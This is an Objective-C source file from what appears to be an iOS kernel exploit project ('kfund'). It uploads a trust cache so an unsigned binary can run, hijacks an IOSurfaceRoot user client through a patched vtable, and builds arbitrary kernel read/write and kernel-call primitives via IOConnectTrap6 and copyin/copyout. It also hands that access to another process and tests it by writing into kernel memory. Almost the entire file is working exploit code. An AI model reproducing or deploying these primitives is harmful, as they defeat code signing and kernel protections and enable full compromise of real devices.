//
//  handoffKRW.m
//  kfund
//
//  Created by Seo Hyun-gyu on 1/4/24.
//

#import <Foundation/Foundation.h>
#import "../trustcache.h"
#import "../utils.h"
#import "../proc.h"
#import "../krw.h"
#import "../kcall.h"
#import "../handoff/handoff.h"
#import "../offsets.h"
#import <spawn.h>
#import <sys/stat.h>
#import <pthread.h>

static uint32_t _userclient_handoff = 0;

void* run_testkernrw(void* arg) {
    const char* path = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/test-kernrw"].UTF8String;
    util_runCommand(path, NULL, NULL);
    return NULL;
}

void save_kslide(void) {
    NSString* save_path = @"/tmp/kfund.plist";
    
    NSDictionary *dictionary = @{
        @"kslide": @(get_kslide()),
    };
    
    BOOL success = [dictionary writeToFile:save_path atomically:YES];
    if (!success) {
        printf("[-] Failed createPlistAtPath.\n");
    }
}

uint32_t get_uint32t_from_file(const char *filePath) {
    uint32_t val = 0;
    
    FILE *file = fopen(filePath, "r");
    if (file == NULL) {
        printf("[-] Error opening file for reading");
        return val;
    }

    if (fscanf(file, "0x%x", &val) != 1) {
        printf("Error reading uint32_t from file\n");
    }
    fclose(file);

    printf("[+] got 0x%x from %s\n", val, filePath);

    return val;
}

void save_uint32t_to_file(uint32_t value, const char *filePath) {
    FILE *file = fopen(filePath, "w");
    if (file == NULL) {
        printf("[-] Error opening file for writing");
        return;
    }
    
    fprintf(file, "0x%x", value);
    
    printf("[+] saved 0x%x to %s\n", value, filePath);
}

void test_handoffKRW(void) {
    
    remove("/tmp/test_kernrw_user_client.plist");
    remove("/tmp/test_kernrw_handoff_done.txt");
    
    NSString* tcpath = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/test-kernrw.tc"];
    uint64_t trustCacheKaddr = staticTrustCacheUploadFileAtPath(tcpath, NULL);
    printf("trustCacheKaddr: 0x%llx\n", trustCacheKaddr);
    
    const char* path = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/test-kernrw"].UTF8String;
    chmod(path, 0755);
    
    pthread_t thread;
    if (pthread_create(&thread, NULL, run_testkernrw, NULL) != 0) {
        perror("pthread_create failed");
        return;
    }
    usleep(10000);
    pid_t test_kernrw_pid = pid_by_name("test-kernrw");
    
    while(1) {
        if(access("/tmp/test_kernrw_user_client.plist", F_OK) == 0)
            break;
    }
    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:@"/tmp/test_kernrw_user_client.plist"];
    uint32_t test_kernrw_uc = (uint32_t)[dict[@"test_kernrw_user_client"] unsignedLongLongValue];
    
    
    uint64_t test_kernrw_userclient_vtable = 0;
    uint64_t test_kernrw_userclient_addr = 0;
    
    setup_remote_client((io_connect_t)test_kernrw_uc, (pid_t)test_kernrw_pid, &test_kernrw_userclient_vtable, &test_kernrw_userclient_addr);
    install_kernel_primitive(test_kernrw_userclient_addr, test_kernrw_userclient_vtable);
    fclose(fopen("/tmp/test_kernrw_handoff_done.txt","w"));
    
    sleep(3);
    kfree(test_kernrw_userclient_vtable, 0x1000);
    kfree(test_kernrw_userclient_addr, 0x1000);
}

uint32_t get_user_client(void) {
    uint32_t user_client = 0;
    
    io_service_t service = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == IO_OBJECT_NULL) {
        printf("[-] Failed to get IOSurfaceRoot service");
        return -1;
    }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        printf("[-] Failed to open IOSurfaceRoot service");
        return -1;
    }
    user_client = conn;
    IOObjectRelease(service);

    return user_client;
}

uint64_t kcall_handoff(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4) {
    uint64_t x6 = addr;  //BR X6
//         x0 -> x1
//         x1 -> x2
//         x2 -> x3
//         x3 -> x4
//         x4 -> x5
//         IOConnectTrap6(port, 0, x1, x2, x3, x4, x5, x6)
    return IOConnectTrap6(_userclient_handoff, 0, x0, x1, x2, x3, x4, x6);
}

void kreadbuf_handoff(uint64_t addr, void *buf, size_t len)
{
    uint64_t copyout_addr = off_copyout + get_kslide();
    kcall_handoff(copyout_addr, addr, (uint64_t)buf, len, 0, 0);
}

void kwritebuf_handoff(uint64_t addr, void *buf, size_t len)
{
    uint64_t copyin_addr = off_copyin + get_kslide();
    kcall_handoff(copyin_addr, (uint64_t)buf, addr, len, 0, 0);
}

uint32_t kread32_handoff(uint64_t addr) {
    uint32_t val = 0;
    kreadbuf_handoff(addr, &val, sizeof(val));
    return val;
}

uint64_t kread64_handoff(uint64_t addr) {
    uint64_t val = 0;
    kreadbuf_handoff(addr, &val, sizeof(val));
    return val;
}

void kwrite32_handoff(uint64_t addr, uint32_t val) {
    kwritebuf_handoff(addr, &val, sizeof(val));
}

void kwrite64_handoff(uint64_t addr, uint64_t val) {
    kwritebuf_handoff(addr, &val, sizeof(val));
}

void test_handoffKRW_self(void) {
    uint32_t user_client = get_user_client();
    printf("[+] Got user client: 0x%x\n", user_client);
    _userclient_handoff = user_client;
    
    uint64_t self_userclient_vtable = 0;
    uint64_t self_userclient_addr = 0;
    
    setup_remote_client((io_connect_t)user_client, (pid_t)getpid(), &self_userclient_vtable, &self_userclient_addr);
    install_kernel_primitive(self_userclient_addr, self_userclient_vtable);
    
    uint64_t allocated_kaddr = kalloc(8);
    printf("allocated_kaddr kread32 test: 0x%x\n", kread32_handoff(allocated_kaddr));
    kwrite32_handoff(allocated_kaddr, 0x41424344);
    printf("allocated_kaddr kread32 test: 0x%x\n", kread32_handoff(allocated_kaddr));
    kfree(allocated_kaddr, 8);
    
    allocated_kaddr = kalloc(8);
    printf("allocated_kaddr kread64 test: 0x%llx\n", kread64_handoff(allocated_kaddr));
    kwrite64_handoff(allocated_kaddr, 0xcafebabedeadbeef);
    printf("allocated_kaddr kread64 test: 0x%llx\n", kread64_handoff(allocated_kaddr));
    kfree(allocated_kaddr, 8);
    
    //clean-up
    IOServiceClose(user_client);
    kfree(self_userclient_vtable, 0x1000);
    kfree(self_userclient_addr, 0x1000);
}
